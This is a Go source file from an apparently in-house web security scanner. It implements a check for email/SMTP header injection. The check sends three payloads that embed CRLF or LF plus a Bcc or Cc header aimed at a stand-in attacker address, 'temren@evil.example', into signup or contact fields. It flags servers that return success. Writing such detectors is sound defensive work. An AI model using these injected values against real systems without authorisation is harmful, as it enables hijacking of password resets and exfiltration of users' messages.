package scanner

import (
	"bytes"
	"context"
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"

	"github.com/temren/pkg/httpengine"
)

// EmailHeaderInjectionScanner sends bodies with CRLF-embedded To/Cc/Bcc headers to
// signup or contact endpoints to detect SMTP header injection.
type EmailHeaderInjectionScanner struct{}

func NewEmailHeaderInjectionScanner() *EmailHeaderInjectionScanner {
	return &EmailHeaderInjectionScanner{}
}

func (s *EmailHeaderInjectionScanner) Name() string { return "Email/SMTP Header Injection" }

func (s *EmailHeaderInjectionScanner) Scan(ctx context.Context, target string, client *httpengine.Client) ([]Finding, error) {
	payloads := []map[string]string{
		{"email": "victim@example.com\r\nBcc: temren@evil.example"},
		{"email": "victim@example.com%0d%0aBcc:temren@evil.example"},
		{"to":    "victim@example.com\nCc:temren@evil.example"},
	}
	var findings []Finding
	for _, p := range payloads {
		buf, _ := json.Marshal(p)
		req, _ := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewReader(buf))
		req.Header.Set("Content-Type", "application/json")
		resp, err := client.Do(ctx, req)
		if err != nil {
			continue
		}
		body, _ := io.ReadAll(io.LimitReader(resp.Body, 32*1024))
		resp.Body.Close()
		low := strings.ToLower(string(body))
		if resp.StatusCode >= 200 && resp.StatusCode < 300 &&
			!strings.Contains(low, "invalid") && !strings.Contains(low, "error") {
			findings = append(findings, Finding{
				URL: target, Title: "Email Field Accepts CRLF — Possible SMTP Header Injection",
				Description: "Server returned success when the email field contained CR/LF. If a mailer uses the value verbatim, attackers can inject Bcc/Cc to ex-filtrate signup messages or hijack password resets.",
				Severity: SeverityHigh, Confidence: ConfidenceLow, Scanner: s.Name(),
				Payload: string(buf), Timestamp: time.Now(),
				OWASPCategory: "A03:2021-Injection", CVSSScore: 7.5,
			})
		}
	}
	return findings, nil
}
